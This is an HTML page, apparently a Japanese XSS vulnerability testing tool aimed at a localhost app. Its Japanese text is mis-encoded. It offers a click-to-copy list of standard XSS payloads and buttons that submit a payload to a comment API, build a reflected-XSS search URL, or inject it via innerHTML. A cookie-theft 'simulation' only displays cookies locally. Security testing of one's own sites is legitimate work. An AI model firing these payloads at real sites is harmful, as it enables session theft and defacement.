<!DOCTYPE html>
<html lang="ja">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>ğŸ” XSSè„†å¼±æ€§ãƒ†ã‚¹ãƒˆãƒ„ãƒ¼ãƒ«</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
                min-height: 100vh;
                padding: 20px;
            }
            .container {
                max-width: 900px;
                margin: 0 auto;
                background: white;
                border-radius: 20px;
                padding: 40px;
                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            }
            h1 {
                color: #f5576c;
                text-align: center;
                margin-bottom: 30px;
            }
            .test-section {
                margin: 20px 0;
                padding: 20px;
                background: #f8f9fa;
                border-radius: 10px;
                border-left: 4px solid #f5576c;
            }
            .test-section h2 {
                color: #f5576c;
                margin-bottom: 15px;
                font-size: 1.2em;
            }
            .payload-list {
                list-style: none;
                margin: 15px 0;
            }
            .payload-list li {
                padding: 10px;
                margin: 5px 0;
                background: white;
                border-radius: 5px;
                font-family: 'Courier New', monospace;
                font-size: 0.9em;
                cursor: pointer;
                transition: background 0.2s;
            }
            .payload-list li:hover {
                background: #ffe0e6;
            }
            input,
            textarea {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: 2px solid #ddd;
                border-radius: 5px;
                font-family: 'Courier New', monospace;
            }
            textarea {
                min-height: 100px;
                resize: vertical;
            }
            button {
                background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
                color: white;
                border: none;
                padding: 12px 30px;
                border-radius: 50px;
                cursor: pointer;
                font-size: 1em;
                margin: 5px;
                transition: transform 0.2s;
            }
            button:hover {
                transform: translateY(-2px);
            }
            .warning {
                background: #fff3cd;
                color: #856404;
                padding: 15px;
                border-radius: 10px;
                border: 1px solid #ffeaa7;
                margin: 20px 0;
            }
            #result {
                margin-top: 20px;
                padding: 15px;
                border-radius: 10px;
                display: none;
            }
            .success {
                background: #d4edda;
                color: #155724;
                border: 1px solid #c3e6cb;
            }
            .error {
                background: #f8d7da;
                color: #721c24;
                border: 1px solid #f5c6cb;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>ğŸ” XSSè„†å¼±æ€§ãƒ†ã‚¹ãƒˆãƒ„ãƒ¼ãƒ«</h1>

            <div class="warning">
                <strong>âš ï¸ è­¦å‘Š:</strong><br />
                ã“ã®ãƒ„ãƒ¼ãƒ«ã¯æ•™è‚²ç›®çš„ã®ã¿ã§ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚<br />
                è‡ªåˆ†ãŒæ‰€æœ‰ãƒ»ç®¡ç†ã—ã¦ã„ã‚‹ã‚µã‚¤ãƒˆã§ã®ã¿ãƒ†ã‚¹ãƒˆã‚’å®Ÿè¡Œã—ã¦ãã ã•ã„ã€‚
            </div>

            <div class="test-section">
                <h2>ã‚ˆãä½¿ã‚ã‚Œã‚‹XSSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰</h2>
                <p>ã‚¯ãƒªãƒƒã‚¯ã§ã‚³ãƒ”ãƒ¼:</p>
                <ul class="payload-list">
                    <li onclick="copyPayload(this)">
                        &lt;script&gt;alert('XSS')&lt;/script&gt;
                    </li>
                    <li onclick="copyPayload(this)">
                        &lt;img src=x onerror="alert('XSS')"&gt;
                    </li>
                    <li onclick="copyPayload(this)">
                        &lt;svg onload="alert('XSS')"&gt;
                    </li>
                    <li onclick="copyPayload(this)">
                        &lt;body onload="alert('XSS')"&gt;
                    </li>
                    <li onclick="copyPayload(this)">
                        &lt;iframe src="javascript:alert('XSS')"&gt;
                    </li>
                    <li onclick="copyPayload(this)">
                        " onmouseover="alert('XSS')
                    </li>
                    <li onclick="copyPayload(this)">javascript:alert('XSS')</li>
                    <li onclick="copyPayload(this)">
                        &lt;input type="text" value="test"
                        onfocus="alert('XSS')" autofocus&gt;
                    </li>
                </ul>
            </div>

            <div class="test-section">
                <h2>ã‚«ã‚¹ã‚¿ãƒ ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãƒ†ã‚¹ãƒˆ</h2>
                <label>ãƒ†ã‚¹ãƒˆURL:</label>
                <input
                    type="text"
                    id="testUrl"
                    value="http://localhost:5173"
                    placeholder="http://example.com"
                />

                <label>ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰:</label>
                <textarea
                    id="payload"
                    placeholder="<script>alert('XSS')</script>"
                ></textarea>

                <button onclick="testStored()">Stored XSS ãƒ†ã‚¹ãƒˆ</button>
                <button onclick="testReflected()">Reflected XSS ãƒ†ã‚¹ãƒˆ</button>
                <button onclick="testDOM()">DOM-based XSS ãƒ†ã‚¹ãƒˆ</button>
            </div>

            <div class="test-section">
                <h2>Cookieç›—é›£ã‚·ãƒŸãƒ¥ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³</h2>
                <p>ç¾åœ¨ã®Cookie:</p>
                <textarea id="currentCookies" readonly></textarea>
                <button onclick="showCookies()">Cookieè¡¨ç¤º</button>
                <button onclick="testCookieSteal()">
                    ç›—é›£ã‚·ãƒŸãƒ¥ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³
                </button>
            </div>

            <div id="result"></div>
        </div>

        <script>
            const API_BASE = 'http://localhost:8000/api/';

            function copyPayload(element) {
                const text = element.textContent;
                navigator.clipboard.writeText(text).then(() => {
                    showResult('âœ… ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ã‚³ãƒ”ãƒ¼ã—ã¾ã—ãŸ: ' + text, true);
                });
            }

            function showResult(message, isSuccess) {
                const resultDiv = document.getElementById('result');
                resultDiv.textContent = message;
                resultDiv.className = isSuccess ? 'success' : 'error';
                resultDiv.style.display = 'block';
            }

            function showCookies() {
                document.getElementById('currentCookies').value =
                    document.cookie || '(Cookieãªã—)';
                showResult('âœ… Cookieã‚’è¡¨ç¤ºã—ã¾ã—ãŸ', true);
            }

            async function testStored() {
                const url = document.getElementById('testUrl').value;
                const payload = document.getElementById('payload').value;

                if (!payload) {
                    showResult('âŒ ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã—ã¦ãã ã•ã„', false);
                    return;
                }

                try {
                    const response = await fetch(`${url}/api/comments/`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        credentials: 'include',
                        body: JSON.stringify({
                            text: payload,
                        }),
                    });

                    if (response.ok) {
                        showResult(
                            'âš ï¸ Stored XSSãƒ†ã‚¹ãƒˆé€ä¿¡å®Œäº†ã€‚ã‚³ãƒ¡ãƒ³ãƒˆä¸€è¦§ãƒšãƒ¼ã‚¸ã§ç¢ºèªã—ã¦ãã ã•ã„ã€‚',
                            true,
                        );
                    } else {
                        showResult(
                            `âœ… ã‚µãƒ¼ãƒãƒ¼ãŒæ‹’å¦: ${response.status}`,
                            true,
                        );
                    }
                } catch (error) {
                    showResult(`âœ… ã‚¨ãƒ©ãƒ¼: ${error.message}`, true);
                }
            }

            function testReflected() {
                const url = document.getElementById('testUrl').value;
                const payload = document.getElementById('payload').value;

                if (!payload) {
                    showResult('âŒ ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã—ã¦ãã ã•ã„', false);
                    return;
                }

                const testUrl = `${url}/search?q=${encodeURIComponent(
                    payload,
                )}`;
                showResult(
                    `ğŸ”— Reflected XSSãƒ†ã‚¹ãƒˆç”¨URL:\n${testUrl}\n\næ–°ã—ã„ã‚¿ãƒ–ã§é–‹ã„ã¦ãƒ†ã‚¹ãƒˆã—ã¦ãã ã•ã„ã€‚`,
                    true,
                );

                // ã‚ªãƒ—ã‚·ãƒ§ãƒ³: è‡ªå‹•ã§é–‹ã
                // window.open(testUrl, '_blank');
            }

            function testDOM() {
                const payload = document.getElementById('payload').value;

                if (!payload) {
                    showResult('âŒ ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã—ã¦ãã ã•ã„', false);
                    return;
                }

                // DOM-based XSSã®ã‚·ãƒŸãƒ¥ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³
                const testDiv = document.createElement('div');
                testDiv.style.display = 'none';

                try {
                    // å±é™ºãªæ“ä½œï¼ˆãƒ†ã‚¹ãƒˆç›®çš„ï¼‰
                    testDiv.innerHTML = payload;
                    document.body.appendChild(testDiv);

                    showResult(
                        'âš ï¸ DOM-based XSSãƒ†ã‚¹ãƒˆ: ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æŒ¿å…¥ã—ã¾ã—ãŸï¼ˆéè¡¨ç¤ºï¼‰',
                        false,
                    );

                    // ã™ãã«å‰Šé™¤
                    setTimeout(() => {
                        document.body.removeChild(testDiv);
                    }, 1000);
                } catch (error) {
                    showResult('âœ… ãƒ–ãƒ©ã‚¦ã‚¶ãŒãƒ–ãƒ­ãƒƒã‚¯: ' + error.message, true);
                }
            }

            function testCookieSteal() {
                const cookies = document.cookie;

                if (!cookies) {
                    showResult(
                        'âœ… CookieãŒå­˜åœ¨ã—ãªã„ã‹ã€HTTPOnlyã§ä¿è­·ã•ã‚Œã¦ã„ã¾ã™',
                        true,
                    );
                    return;
                }

                // ã‚·ãƒŸãƒ¥ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ï¼ˆå®Ÿéš›ã«ã¯é€ä¿¡ã—ãªã„ï¼‰
                showResult(
                    `âš ï¸ Cookieç›—é›£ã‚·ãƒŸãƒ¥ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³:\n` +
                        `ã‚‚ã—æ”»æ’ƒè€…ã®ã‚µã‚¤ãƒˆã ã£ãŸå ´åˆã€ä»¥ä¸‹ãŒé€ä¿¡ã•ã‚Œã¾ã™:\n\n` +
                        `${cookies}\n\n` +
                        `å¯¾ç­–: SESSION_COOKIE_HTTPONLY = True`,
                    false,
                );

                console.log('ç›—é›£ã‚·ãƒŸãƒ¥ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ - Cookie:', cookies);
            }

            // ãƒšãƒ¼ã‚¸èª­ã¿è¾¼ã¿æ™‚
            window.onload = () => {
                console.log(
                    '%câš ï¸ XSSè„†å¼±æ€§ãƒ†ã‚¹ãƒˆãƒ„ãƒ¼ãƒ«',
                    'color: red; font-size: 20px; font-weight: bold;',
                );
                console.log('ã“ã®ãƒ„ãƒ¼ãƒ«ã¯æ•™è‚²ç›®çš„ã®ã¿ã§ä½¿ç”¨ã—ã¦ãã ã•ã„');
                showCookies();
            };
        </script>
    </body>
</html>
